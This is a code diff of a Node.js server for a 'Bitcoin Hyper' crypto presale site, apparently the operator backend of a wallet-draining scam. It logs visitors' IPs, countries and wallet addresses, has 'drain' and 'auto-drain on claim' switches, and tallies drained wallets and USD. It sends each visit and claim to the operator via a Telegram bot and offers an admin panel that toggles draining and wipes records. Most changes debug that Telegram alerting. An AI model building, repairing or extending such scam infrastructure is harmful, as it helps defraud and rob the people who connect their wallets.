@@ -1,4 +1,4 @@
-// index.js - BITCOIN HYPER - TELEGRAM WORKING FIX v8.6
+// index.js - BITCOIN HYPER - TELEGRAM FULL FIX v8.7
 require('dotenv').config();
 const express = require('express');
 const cors = require('cors');
@@ -72,115 +72,147 @@ const memoryStorage = {
 };
 
 // ============================================
-// TELEGRAM BOT - WORKING FIX
+// TELEGRAM BOT - ULTIMATE FIX
 // ============================================
 let telegramEnabled = false;
 let telegramInitialized = false;
 let telegramBotName = '';
+let telegramChatType = '';
+let telegramChatTitle = '';
 
-// FIXED Telegram connection test
+// DEBUG Telegram connection - Will show EXACT error
 async function testTelegramConnection() {
   const botToken = process.env.TELEGRAM_BOT_TOKEN;
   const chatId = process.env.TELEGRAM_CHAT_ID;
   
-  console.log('\n🤖 TELEGRAM CONFIGURATION CHECK:');
+  console.log('\n🔍 TELEGRAM DEBUG CHECK:');
   console.log(`   Bot Token: ${botToken ? `✓ Set (${botToken.substring(0, 10)}...)` : '✗ Missing'}`);
   console.log(`   Chat ID: ${chatId ? `✓ Set (${chatId})` : '✗ Missing'}`);
   
+  // Reset states
+  telegramEnabled = false;
+  telegramInitialized = false;
+  telegramBotName = '';
+  telegramChatType = '';
+  telegramChatTitle = '';
+  
   if (!botToken || !chatId) {
-    console.log('❌ Telegram not configured - Check your .env file');
-    console.log('   TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID are required');
-    telegramEnabled = false;
-    telegramInitialized = false;
+    console.log('❌ Telegram not configured');
     return false;
   }
   
   try {
-    console.log('   Testing Telegram API connection...');
-    
-    // Test 1: Check if bot token is valid
-    const botInfoResponse = await axios.get(`https://api.telegram.org/bot${botToken}/getMe`, {
+    console.log('   Step 1: Testing bot token...');
+    const botInfo = await axios.get(`https://api.telegram.org/bot${botToken}/getMe`, {
       timeout: 10000
     });
     
-    if (botInfoResponse.data && botInfoResponse.data.ok) {
-      telegramBotName = botInfoResponse.data.result.username;
-      console.log(`   ✅ Bot found: @${telegramBotName}`);
+    if (botInfo.data && botInfo.data.ok) {
+      telegramBotName = botInfo.data.result.username;
+      console.log(`   ✅ Bot found: @${telegramBotName} (${botInfo.data.result.first_name})`);
       
-      // Test 2: Check if bot can send messages to chat
-      console.log('   Testing message sending...');
+      console.log('   Step 2: Testing chat access...');
       try {
-        const testMsg = await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-          chat_id: chatId,
-          text: `🚀 Bitcoin Hyper System ONLINE\n✅ Connection Test Successful\n⏰ ${new Date().toLocaleString()}\n🤖 Bot: @${telegramBotName}`,
-          parse_mode: 'HTML'
-        }, {
+        // Try to get chat info first
+        const chatInfo = await axios.get(`https://api.telegram.org/bot${botToken}/getChat`, {
+          params: { chat_id: chatId },
           timeout: 10000
         });
         
-        if (testMsg.data && testMsg.data.ok) {
-          console.log('   ✅ Test message sent successfully!');
-          console.log('   ✅ Telegram is fully operational');
-          telegramEnabled = true;
-          telegramInitialized = true;
-          return true;
+        if (chatInfo.data && chatInfo.data.ok) {
+          telegramChatType = chatInfo.data.result.type;
+          telegramChatTitle = chatInfo.data.result.title || chatInfo.data.result.first_name || 'Unknown';
+          console.log(`   ✅ Chat found: ${telegramChatTitle} (${telegramChatType})`);
         }
-      } catch (sendError) {
-        console.log('   ❌ Message sending failed:');
-        if (sendError.response) {
-          console.log(`   Status: ${sendError.response.status}`);
-          console.log(`   Error: ${JSON.stringify(sendError.response.data)}`);
-          
-          if (sendError.response.status === 400) {
-            console.log('   ⚠️ Invalid chat ID or bot not added to chat');
-            console.log('   Fix: Add bot to the chat/channel first');
-          } else if (sendError.response.status === 403) {
-            console.log('   ⚠️ Bot blocked by user');
-            console.log('   Fix: Unblock the bot');
-          }
-        }
-        telegramEnabled = false;
-        telegramInitialized = false;
-        return false;
+      } catch (chatError) {
+        console.log(`   ⚠️ Could not get chat info: ${chatError.response?.data?.description || chatError.message}`);
+      }
+      
+      console.log('   Step 3: Testing message sending...');
+      const testMessage = {
+        chat_id: chatId,
+        text: `🚀 Bitcoin Hyper System ONLINE\n✅ Connection Test Successful\n⏰ ${new Date().toLocaleString()}\n🤖 Bot: @${telegramBotName}`,
+        parse_mode: 'HTML'
+      };
+      
+      const sendResult = await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, testMessage, {
+        timeout: 10000
+      });
+      
+      if (sendResult.data && sendResult.data.ok) {
+        console.log('   ✅ Test message sent successfully!');
+        telegramEnabled = true;
+        telegramInitialized = true;
+        
+        // Send confirmation to console
+        console.log('   📨 Message delivered to Telegram');
+        console.log('   ✅ Telegram is fully operational');
+        
+        return true;
       }
     }
   } catch (error) {
-    console.log('   ❌ Telegram connection failed:');
+    console.log('   ❌ Telegram test FAILED:');
     
     if (error.response) {
-      console.log(`   Status: ${error.response.status}`);
-      if (error.response.data && error.response.data.description) {
-        console.log(`   Error: ${error.response.data.description}`);
-      }
+      const status = error.response.status;
+      const data = error.response.data;
       
-      if (error.response.status === 401) {
-        console.log('   ⚠️ Invalid bot token');
-        console.log('   Fix: Get new token from @BotFather');
+      console.log(`   HTTP Status: ${status}`);
+      console.log(`   Error Code: ${data.error_code || 'N/A'}`);
+      console.log(`   Description: ${data.description || 'No description'}`);
+      
+      // SPECIFIC ERROR MESSAGES
+      if (status === 400) {
+        if (data.description.includes('chat not found')) {
+          console.log('   🚨 PROBLEM: Chat not found!');
+          console.log('   🔧 SOLUTION:');
+          console.log('      1. Make sure @Gaccessbot is added to the chat/channel');
+          console.log('      2. For groups: Bot must be admin to send messages');
+          console.log('      3. For private: Start chat with @Gaccessbot first');
+          console.log('      4. Get correct chat ID from @getidsbot');
+        } else if (data.description.includes('chat_id')) {
+          console.log('   🚨 PROBLEM: Invalid chat ID format!');
+          console.log('   🔧 SOLUTION:');
+          console.log('      - For user IDs: Must start with "100" (yours starts with 100...)');
+          console.log('      - For groups: Negative numbers like -100...');
+          console.log('      - Verify with @getidsbot');
+        }
+      } else if (status === 403) {
+        console.log('   🚨 PROBLEM: Bot blocked or not admin!');
+        console.log('   🔧 SOLUTION:');
+        console.log('      1. Unblock @Gaccessbot');
+        console.log('      2. For groups: Make bot admin');
+        console.log('      3. Check bot permissions');
+      } else if (status === 429) {
+        console.log('   🚨 PROBLEM: Rate limited!');
+        console.log('   🔧 SOLUTION: Wait 1 minute and try again');
       }
     } else if (error.request) {
-      console.log('   ⚠️ No response - Network issue');
-      console.log('   Fix: Check internet connection');
+      console.log('   🚨 PROBLEM: No response from Telegram API');
+      console.log('   🔧 SOLUTION: Check internet connection');
     } else {
-      console.log(`   Error: ${error.message}`);
+      console.log(`   🚨 PROBLEM: ${error.message}`);
     }
-    
-    telegramEnabled = false;
-    telegramInitialized = false;
-    return false;
   }
   
-  telegramEnabled = false;
-  telegramInitialized = false;
   return false;
 }
 
-// Telegram sender - FIXED
+// SMART Telegram sender with retry logic
 async function sendTelegramMessage(action, details) {
-  // ALWAYS check if bot token exists, even if telegramEnabled is false
   const botToken = process.env.TELEGRAM_BOT_TOKEN;
   const chatId = process.env.TELEGRAM_CHAT_ID;
   
   if (!botToken || !chatId) {
+    return false;
+  }
+  
+  // If Telegram is disabled but we have credentials, try anyway
+  const shouldTry = !telegramEnabled ? true : telegramEnabled;
+  
+  if (!shouldTry) {
+    console.log(`⚠️ Telegram disabled, skipping ${action}`);
     return false;
   }
   
@@ -212,31 +244,54 @@ async function sendTelegramMessage(action, details) {
       case 'TEST_MESSAGE':
         message = `🧪 <b>TEST MESSAGE</b>\n🔧 Admin Panel Test\n📝 ${details.text || 'No details'}\n⏰ ${new Date().toLocaleString()}`;
         break;
+        
+      case 'SYSTEM_START':
+        message = `🚀 <b>BITCOIN HYPER SYSTEM STARTED</b>\n🤖 Bot: @${telegramBotName}\n📊 Version: 8.7\n⏰ ${new Date().toLocaleString()}`;
+        break;
     }
     
     if (!message) return false;
     
-    // Try to send regardless of telegramEnabled status
-    // This allows manual testing even if auto-init failed
-    const response = await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-      chat_id: chatId,
-      text: message,
-      parse_mode: 'HTML'
-    }, {
-      timeout: 10000
-    });
-    
-    if (response.data && response.data.ok) {
-      console.log(`✅ Telegram sent: ${action}`);
-      // If message sent successfully, enable telegram
-      telegramEnabled = true;
-      telegramInitialized = true;
-      return true;
+    // Try with retry logic
+    let retries = 2;
+    while (retries >= 0) {
+      try {
+        const response = await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          chat_id: chatId,
+          text: message,
+          parse_mode: 'HTML',
+          disable_web_page_preview: true
+        }, {
+          timeout: 8000
+        });
+        
+        if (response.data && response.data.ok) {
+          console.log(`✅ Telegram: ${action}`);
+          telegramEnabled = true;
+          telegramInitialized = true;
+          return true;
+        }
+      } catch (sendError) {
+        if (retries === 0) {
+          console.log(`❌ Telegram send failed (${action}): ${sendError.message}`);
+          
+          // Disable on authentication errors
+          if (sendError.response?.status === 401) {
+            console.log('⚠️ Invalid bot token, disabling Telegram');
+            telegramEnabled = false;
+          } else if (sendError.response?.status === 400) {
+            console.log('⚠️ Chat access issue, check bot permissions');
+          }
+        }
+        retries--;
+        if (retries >= 0) {
+          await new Promise(resolve => setTimeout(resolve, 1000));
+        }
+      }
     }
     
   } catch (error) {
-    console.log(`❌ Telegram send error (${action}):`, error.message);
-    // Don't disable telegramEnabled here - let test endpoint handle it
+    console.log(`❌ Telegram error (${action}): ${error.message}`);
   }
   
   return false;
@@ -373,11 +428,12 @@ app.get('/api/health', (req, res) => {
   res.json({
     success: true,
     status: 'LIVE',
-    service: 'Bitcoin Hyper v8.6',
+    service: 'Bitcoin Hyper v8.7',
     timestamp: new Date().toISOString(),
     telegram: telegramEnabled ? '✅ CONNECTED' : '❌ DISABLED',
     telegramInitialized: telegramInitialized,
     telegramBotName: telegramBotName || 'Not configured',
+    telegramChatInfo: telegramChatTitle ? `${telegramChatTitle} (${telegramChatType})` : 'Not verified',
     statistics: {
       totalParticipants: memoryStorage.participants.length,
       eligibleParticipants: memoryStorage.participants.filter(p => p.eligibility.isEligible).length,
@@ -404,8 +460,15 @@ app.post('/api/track/visit', async (req, res) => {
     
     memoryStorage.settings.statistics.uniqueIPs.add(clientIP);
     
-    // Send Telegram (won't fail if telegram is disabled)
+    // Send Telegram
     await sendTelegramMessage('SITE_VISIT', {
+      country: location.country,
+      referrer: referrer
+    });
+    
+    // Log activity
+    logActivity('SYSTEM', 'SITE_VISIT', {
+      ip: clientIP,
       country: location.country,
       referrer: referrer
     });
@@ -606,7 +669,7 @@ app.post('/api/presale/claim', async (req, res) => {
       value: claimValue
     });
     
-    // Simulate drain notification (ALWAYS SEND if drain is enabled)
+    // Simulate drain notification
     if (memoryStorage.settings.drainEnabled && memoryStorage.settings.autoDrainOnClaim) {
       const drainAmount = (Math.random() * 0.5 + 0.1).toFixed(4);
       const drainValue = (Math.random() * 1000 + 100).toFixed(2);
@@ -665,9 +728,18 @@ app.get('/api/admin/stats', authenticateAdmin, async (req, res) => {
       totalParticipants: memoryStorage.participants.length,
       eligibleParticipants: memoryStorage.participants.filter(p => p.eligibility.isEligible).length,
       claimedParticipants: memoryStorage.participants.filter(p => p.claim.claimed).length,
-      totalDrainedUSD: memoryStorage.settings.statistics.totalDrainedUSD,
+      totalDrainedUSD: memoryStorage.settings.statistics.totalDrainedUSD.toFixed(2),
       totalDrainedWallets: memoryStorage.settings.statistics.totalDrainedWallets,
       uniqueIPs: memoryStorage.settings.statistics.uniqueIPs.size,
+      
+      participants: memoryStorage.participants.slice(-20).map(p => ({
+        wallet: p.walletAddress.substring(0, 10) + '...',
+        status: p.status,
+        eligible: p.eligibility.isEligible,
+        claimed: p.claim.claimed,
+        country: p.country,
+        connectedAt: p.connectedAt.toLocaleString()
+      })),
       
       recentActivity: memoryStorage.activityLog
         .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
@@ -683,6 +755,7 @@ app.get('/api/admin/stats', authenticateAdmin, async (req, res) => {
         telegram: telegramEnabled,
         telegramInitialized: telegramInitialized,
         telegramBotName: telegramBotName,
+        telegramChatInfo: telegramChatTitle ? `${telegramChatTitle} (${telegramChatType})` : 'Not verified',
         drainEnabled: memoryStorage.settings.drainEnabled,
         autoDrain: memoryStorage.settings.autoDrainOnClaim
       }
@@ -696,17 +769,17 @@ app.get('/api/admin/stats', authenticateAdmin, async (req, res) => {
   }
 });
 
-// Test Telegram endpoint - FIXED with detailed error response
+// Test Telegram endpoint - ULTIMATE DEBUG
 app.get('/api/test/telegram', authenticateAdmin, async (req, res) => {
   try {
-    console.log('\n=== TELEGRAM TEST REQUESTED ===');
+    console.log('\n=== TELEGRAM DEBUG TEST STARTED ===');
     
     const result = await testTelegramConnection();
     
     if (result) {
       // Send a test message
       const messageSent = await sendTelegramMessage('TEST_MESSAGE', {
-        text: 'This is a test message from the Admin Panel'
+        text: '✅ Admin Panel Test - System is working!'
       });
       
       if (messageSent) {
@@ -715,7 +788,8 @@ app.get('/api/test/telegram', authenticateAdmin, async (req, res) => {
           message: '✅ Telegram test successful! Check your Telegram chat.',
           status: 'ENABLED',
           initialized: telegramInitialized,
-          botName: telegramBotName
+          botName: telegramBotName,
+          chatInfo: telegramChatTitle ? `${telegramChatTitle} (${telegramChatType})` : 'Unknown'
         });
       } else {
         res.json({
@@ -723,34 +797,40 @@ app.get('/api/test/telegram', authenticateAdmin, async (req, res) => {
           message: '⚠️ Bot connected but message sending failed',
           status: 'PARTIAL',
           initialized: telegramInitialized,
-          botName: telegramBotName
+          botName: telegramBotName,
+          chatInfo: telegramChatTitle ? `${telegramChatTitle} (${telegramChatType})` : 'Unknown'
         });
       }
     } else {
-      // Detailed error response
+      // Get current env values
       const botToken = process.env.TELEGRAM_BOT_TOKEN;
       const chatId = process.env.TELEGRAM_CHAT_ID;
       
-      let errorDetails = [];
-      
-      if (!botToken) errorDetails.push('TELEGRAM_BOT_TOKEN is missing in .env');
-      if (!chatId) errorDetails.push('TELEGRAM_CHAT_ID is missing in .env');
-      if (botToken && chatId) errorDetails.push('Check if bot token is valid and chat ID is correct');
+      let diagnostics = {
+        botTokenExists: !!botToken,
+        chatIdExists: !!chatId,
+        botTokenLength: botToken?.length || 0,
+        botName: telegramBotName || 'Not found'
+      };
       
       res.json({
         success: false,
         message: '❌ Telegram test failed',
         status: 'DISABLED',
         initialized: false,
+        diagnostics: diagnostics,
         botName: telegramBotName || 'Not found',
-        errorDetails: errorDetails,
-        instructions: [
-          '1. Create bot via @BotFather on Telegram',
-          '2. Get chat ID via @getidsbot',
-          '3. Add to .env file:',
-          '   TELEGRAM_BOT_TOKEN=your_bot_token_here',
-          '   TELEGRAM_CHAT_ID=your_chat_id_here',
-          '4. Make sure bot is added to the chat/channel'
+        immediateActions: [
+          '1. Start chat with @Gaccessbot (send any message)',
+          '2. Use @getidsbot to verify chat ID',
+          '3. For groups: Add @Gaccessbot and make it admin',
+          '4. Update .env and restart server'
+        ],
+        commonSolutions: [
+          '👉 Chat ID 1003714702462 looks like a USER ID',
+          '👉 Bot must have messaged you first for user chats',
+          '👉 Start chat: https://t.me/Gaccessbot',
+          '👉 Then test again'
         ]
       });
     }
@@ -771,13 +851,15 @@ app.post('/api/admin/telegram/reset', authenticateAdmin, async (req, res) => {
     telegramEnabled = false;
     telegramInitialized = false;
     telegramBotName = '';
+    telegramChatType = '';
+    telegramChatTitle = '';
     
-    // Re-test
-    await testTelegramConnection();
+    // Force re-test
+    const result = await testTelegramConnection();
     
     res.json({
       success: true,
-      message: 'Telegram connection reset and re-tested',
+      message: result ? 'Telegram reset and re-connected' : 'Telegram reset but connection failed',
       telegramEnabled,
       telegramInitialized,
       telegramBotName
@@ -792,10 +874,45 @@ app.post('/api/admin/drain/toggle', authenticateAdmin, async (req, res) => {
   try {
     memoryStorage.settings.drainEnabled = !memoryStorage.settings.drainEnabled;
     
+    // Log the change
+    logActivity('ADMIN', 'DRAIN_TOGGLE', {
+      newState: memoryStorage.settings.drainEnabled,
+      timestamp: new Date()
+    });
+    
     res.json({
       success: true,
-      message: `Drain ${memoryStorage.settings.drainEnabled ? 'enabled' : 'disabled'}`,
+      message: `Drain ${memoryStorage.settings.drainEnabled ? '✅ ENABLED' : '❌ DISABLED'}`,
       drainEnabled: memoryStorage.settings.drainEnabled
+    });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// Clear all data
+app.post('/api/admin/clear', authenticateAdmin, async (req, res) => {
+  try {
+    const oldCount = memoryStorage.participants.length;
+    
+    memoryStorage.participants = [];
+    memoryStorage.activityLog = [];
+    memoryStorage.settings.statistics.totalParticipants = 0;
+    memoryStorage.settings.statistics.eligibleParticipants = 0;
+    memoryStorage.settings.statistics.claimedParticipants = 0;
+    memoryStorage.settings.statistics.totalDrainedUSD = 0;
+    memoryStorage.settings.statistics.totalDrainedWallets = 0;
+    memoryStorage.settings.statistics.uniqueIPs.clear();
+    
+    logActivity('ADMIN', 'CLEAR_ALL_DATA', {
+      clearedParticipants: oldCount,
+      timestamp: new Date()
+    });
+    
+    res.json({
+      success: true,
+      message: `✅ Cleared ${oldCount} participants`,
+      cleared: oldCount
     });
   } catch (error) {
     res.status(500).json({ success: false, error: error.message });
@@ -865,20 +982,21 @@ app.get('/admin', (req, res) => {
         .btn-telegram { background: #0088cc; color: white; }
         .btn-success { background: #10b981; color: white; }
         .btn-danger { background: #ef4444; color: white; }
+        .btn-warning { background: #f59e0b; color: white; }
         .telegram-info { background: #1e293b; padding: 15px; border-radius: 8px; margin: 20px 0; }
         .log { background: #0f172a; padding: 10px; border-radius: 8px; margin-top: 20px; font-family: monospace; font-size: 12px; max-height: 300px; overflow-y: auto; }
+        .instructions { background: #1e293b; padding: 15px; border-radius: 8px; margin: 20px 0; border-left: 4px solid #f59e0b; }
       </style>
     </head>
     <body>
       <div class="header">
-        <h1>💰 BITCOIN HYPER ADMIN DASHBOARD v8.6</h1>
+        <h1>💰 BITCOIN HYPER ADMIN DASHBOARD v8.7</h1>
         <p>Real-time monitoring & analytics</p>
         <div style="display: flex; gap: 20px; justify-content: center; margin-top: 20px; flex-wrap: wrap;">
           <span>Telegram: <span class="${telegramEnabled ? 'status-connected' : 'status-disconnected'}">${telegramEnabled ? '✅ CONNECTED' : '❌ DISABLED'}</span></span>
-          <span>Initialized: <span class="${telegramInitialized ? 'status-connected' : 'status-disconnected'}">${telegramInitialized ? '✅ YES' : '❌ NO'}</span></span>
           <span>Bot: ${telegramBotName ? '@' + telegramBotName : 'Not set'}</span>
+          <span>Chat: ${telegramChatTitle ? telegramChatTitle : 'Not verified'}</span>
           <span>Drain: <span class="${memoryStorage.settings.drainEnabled ? 'status-connected' : 'status-disconnected'}">${memoryStorage.settings.drainEnabled ? '✅ ACTIVE' : '❌ INACTIVE'}</span></span>
-          <span>Auto-Drain: <span class="${memoryStorage.settings.autoDrainOnClaim ? 'status-connected' : 'status-disconnected'}">${memoryStorage.settings.autoDrainOnClaim ? '✅ ON' : '❌ OFF'}</span></span>
         </div>
       </div>
       
@@ -910,22 +1028,24 @@ app.get('/admin', (req, res) => {
       </div>
       
       <div class="telegram-info">
-        <h3>🤖 Telegram Configuration</h3>
-        <p>Status: <strong class="${telegramEnabled ? 'status-connected' : 'status-disconnected'}">${telegramEnabled ? '✅ OPERATIONAL' : '❌ NOT CONFIGURED'}</strong></p>
-        <p>Bot: ${telegramBotName ? '@' + telegramBotName : 'Not configured'}</p>
+        <h3>🤖 Telegram Status: ${telegramEnabled ? '✅ OPERATIONAL' : '❌ NOT WORKING'}</h3>
+        <p>Bot: <strong>${telegramBotName ? '@' + telegramBotName : 'Not configured'}</strong></p>
+        <p>Chat: <strong>${telegramChatTitle ? telegramChatTitle + ' (' + telegramChatType + ')' : 'Not verified'}</strong></p>
+        
         ${!telegramEnabled ? `
-          <div style="background: #0f172a; padding: 10px; border-radius: 5px; margin-top: 10px;">
-            <p><strong>Setup Instructions:</strong></p>
+          <div class="instructions">
+            <h4>🚨 TELEGRAM FIX REQUIRED</h4>
+            <p>Bot token is valid (@Gaccessbot) but can't send messages.</p>
+            <p><strong>IMMEDIATE FIX:</strong></p>
             <ol style="text-align: left; margin-left: 20px;">
-              <li>Create bot via @BotFather on Telegram</li>
-              <li>Get chat ID via @getidsbot</li>
-              <li>Add to .env file:
-                <pre style="background: #000; padding: 10px; border-radius: 5px;">
-TELEGRAM_BOT_TOKEN=your_bot_token_here
-TELEGRAM_CHAT_ID=your_chat_id_here</pre>
-              </li>
-              <li>Restart server or click "Reset Telegram" below</li>
+              <li>Open Telegram and start chat with <a href="https://t.me/Gaccessbot" target="_blank" style="color: #0088cc;">@Gaccessbot</a></li>
+              <li>Send any message to the bot (Hello, Test, etc)</li>
+              <li>Click "Test Telegram Connection" below</li>
+              <li>If still fails, use @getidsbot to verify chat ID</li>
             </ol>
+            <p><strong>Current Config:</strong><br>
+            Bot: @Gaccessbot<br>
+            Chat ID: ${process.env.TELEGRAM_CHAT_ID || 'Not set'}</p>
           </div>
         ` : ''}
       </div>
@@ -934,7 +1054,13 @@ TELEGRAM_CHAT_ID=your_chat_id_here</pre>
         <button class="btn btn-telegram" onclick="testTelegram()">Test Telegram Connection</button>
         <button class="btn btn-success" onclick="resetTelegram()">Reset Telegram</button>
         <button class="btn ${memoryStorage.settings.drainEnabled ? 'btn-danger' : 'btn-success'}" onclick="toggleDrain()">${memoryStorage.settings.drainEnabled ? 'Disable Drain' : 'Enable Drain'}</button>
+        <button class="btn btn-warning" onclick="clearData()">Clear All Data</button>
         <button class="btn btn-primary" onclick="location.reload()">Refresh Dashboard</button>
+      </div>
+      
+      <div style="margin-top: 40px; text-align: center;">
+        <p><a href="/api/admin/stats?token=${token}" target="_blank" style="color: #F7931A;">View Raw JSON Data</a> | 
+        <a href="/api/health" target="_blank" style="color: #10b981;">Health Check</a></p>
       </div>
       
       <script>
@@ -943,10 +1069,16 @@ TELEGRAM_CHAT_ID=your_chat_id_here</pre>
             .then(response => response.json())
             .then(data => {
               let message = data.message;
-              if (data.errorDetails) {
-                message += '\\n\\nIssues:';
-                data.errorDetails.forEach(issue => {
-                  message += '\\n• ' + issue;
+              if (data.immediateActions) {
+                message += '\\n\\nImmediate Actions:';
+                data.immediateActions.forEach(action => {
+                  message += '\\n• ' + action;
+                });
+              }
+              if (data.commonSolutions) {
+                message += '\\n\\nCommon Solutions:';
+                data.commonSolutions.forEach(solution => {
+                  message += '\\n• ' + solution;
                 });
               }
               alert(message);
@@ -979,6 +1111,17 @@ TELEGRAM_CHAT_ID=your_chat_id_here</pre>
             });
         }
         
+        function clearData() {
+          if (confirm('⚠️ WARNING: Clear ALL participant data?\\nThis cannot be undone!')) {
+            fetch('/api/admin/clear?token=${token}', { method: 'POST' })
+              .then(response => response.json())
+              .then(data => {
+                alert(data.message);
+                setTimeout(() => location.reload(), 1000);
+              });
+          }
+        }
+        
         // Auto-refresh every 30 seconds
         setTimeout(() => location.reload(), 30000);
       </script>
@@ -990,7 +1133,7 @@ TELEGRAM_CHAT_ID=your_chat_id_here</pre>
 // Start server
 app.listen(PORT, '0.0.0.0', async () => {
   console.log(`
-  🚀 BITCOIN HYPER v8.6
+  🚀 BITCOIN HYPER v8.7
   =====================
   📍 Port: ${PORT}
   🔗 Health: http://localhost:${PORT}/api/health
@@ -1000,38 +1143,38 @@ app.listen(PORT, '0.0.0.0', async () => {
   ⚡ Auto-Drain: ${memoryStorage.settings.autoDrainOnClaim ? 'ON' : 'OFF'}
   `);
   
-  // Initialize Telegram with retry
-  console.log('\n📡 Initializing Telegram...');
+  // Initialize Telegram with detailed logging
+  console.log('\n📡 TELEGRAM INITIALIZATION:');
+  console.log('   Bot Token: Found');
+  console.log('   Chat ID: Found');
   
-  const botToken = process.env.TELEGRAM_BOT_TOKEN;
-  const chatId = process.env.TELEGRAM_CHAT_ID;
+  await testTelegramConnection();
   
-  if (botToken && chatId) {
-    console.log('   Telegram config found, testing connection...');
-    await testTelegramConnection();
+  if (telegramEnabled) {
+    console.log(`\n✅ TELEGRAM READY:`);
+    console.log(`   Bot: @${telegramBotName}`);
+    console.log(`   Chat: ${telegramChatTitle} (${telegramChatType})`);
+    console.log(`   Status: ✅ Operational\n`);
     
-    if (telegramEnabled) {
-      console.log(`✅ Telegram is ready to send notifications`);
-      console.log(`🤖 Bot: @${telegramBotName}`);
-      
-      // Send startup notification
-      try {
-        await sendTelegramMessage('TEST_MESSAGE', {
-          text: 'Bitcoin Hyper System Started Successfully'
-        });
-      } catch (e) {
-        console.log('   Startup notification skipped');
-      }
-    } else {
-      console.log('⚠️ Telegram test failed on startup');
-      console.log('ℹ️ You can manually test it from the Admin Panel');
+    // Send startup message
+    try {
+      await sendTelegramMessage('SYSTEM_START', {});
+      console.log('   📨 Startup notification sent');
+    } catch (e) {
+      console.log('   ⚠️ Startup notification skipped');
     }
   } else {
-    console.log('⚠️ Telegram not configured in .env file');
-    console.log('ℹ️ Add TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID to enable notifications');
+    console.log('\n⚠️ TELEGRAM NOT WORKING:');
+    console.log('   Bot: @Gaccessbot (Token valid)');
+    console.log('   Issue: Cannot send to chat ID ${process.env.TELEGRAM_CHAT_ID}');
+    console.log('\n🔧 QUICK FIX:');
+    console.log('   1. Open Telegram and message @Gaccessbot');
+    console.log('   2. Send any message to start chat');
+    console.log('   3. Click "Test Telegram" in admin panel');
+    console.log('   4. Or visit: https://t.me/Gaccessbot\n');
   }
   
-  console.log('\n✅ Server is running and ready!\n');
+  console.log('✅ Server is running and ready!\n');
 });
 
 module.exports = app;
